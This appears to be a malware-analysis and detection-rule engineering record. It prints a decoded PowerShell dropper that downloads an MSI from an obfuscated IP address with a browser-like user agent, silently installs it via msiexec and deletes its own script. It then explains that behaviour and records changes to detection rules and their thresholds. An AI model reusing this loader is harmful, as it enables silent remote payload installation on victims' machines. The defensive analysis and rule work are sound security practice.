decode.source:
$env:__ST=$MyInvocation.MyCommand.Path
[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12
$client=New-Object Net.WebClient
$client.Headers['User-Agent']='Mozilla/5.0 Chrome/131'
$url='http://1450003207/app/19481b28bd67/IconEdit2Turb.msi'
$msi=Join-Path $env:TEMP ([guid]::NewGuid().ToString()+'_IconEdit2Turb.msi')
for($attempt=0;$attempt -lt 3;$attempt++) {
 try {$client.DownloadFile($url,$msi);break} catch {Start-Sleep -Milliseconds (Get-Random -Minimum 300 -Maximum 900)}
}
Unblock-File -LiteralPath $msi
Start-Process msiexec.exe -ArgumentList ('/i "'+$msi+'" /qn /norestart') -Wait
Remove-Item -LiteralPath $env:__ST -Force

execution: Stores entry path, reconstructs source, dot-sources created ScriptBlock.
Configures TLS12 but URL uses plain HTTP; supplies Chrome-like user agent.
Downloads MSI to a GUID-prefixed TEMP path, with three attempts and 300-899 ms random delays after failures.
Unblock-File attempts to remove downloaded-file restriction; msiexec /i /qn /norestart installs without UI, and the script waits.
Remove-Item attempts to remove the path stored in env:__ST, rather than deleting the MSI.
The decoded script reassigns env:__ST inside the created ScriptBlock. Success of path recovery and cleanup depends on PowerShell invocation context.
No integrity or signature check occurs before execution; exhaustion of all download attempts still falls through to install.

rule_decisions.severity: Retain two suspicious arithmetic-concealment traits per sample. Do not promote generic download/eval or silent installation to hostile, or infer final-payload functionality from wrappers.
rule_decisions.array: Relocate array syntax from embedded/payload to data/collection/array; remove redundant 25-value matcher. Canonical matcher retains its original scope and 17-value threshold. Its decoder composite now covers embedded hosts and arrays of 17-24 values, a deliberate neutral-coverage gain.
rule_decisions.managed_process: Move Process.Start to subprocess: it starts the managed Process object representing a child. Move ProcessStartInfo construction to launch flags/configuration; remove unsupported execution-tactic and objective-level MBC mappings from constructor. Preserve matchers, types, platforms and exclusions.
rule_decisions.consumers: Replace exact moved IDs. Preserve spawn-directory role in timing composites as an OR. Other spawn-directory consumers exclude C# by type. Remove one redundant ASP.NET launch umbrella and inline its identical four-alternative set in its sole consumer; no threshold/proximity consumer depends on the removed group. Subprocess and flags remain within their 100-rule budgets.
rule_decisions.python: New argv-structured launch rule requires PowerShell as first list element and -Command immediately followed by source. Existing broad token rules describe token evidence, not invocation or flag binding.
rule_decisions.limitations: Cleave facts contain no decoded arithmetic layer. Thus HTTP, MSI, unblocking and cleanup behavior is established by independent reverse engineering, not surfaced by new raw-number signatures. Do not key traits on sample-specific integers, keys, paths or IOCs.

controls: Six benign fixtures cover actual command-source launch versus executable-token arguments and -File, and C# launch versus constructor-only or quoted API text.
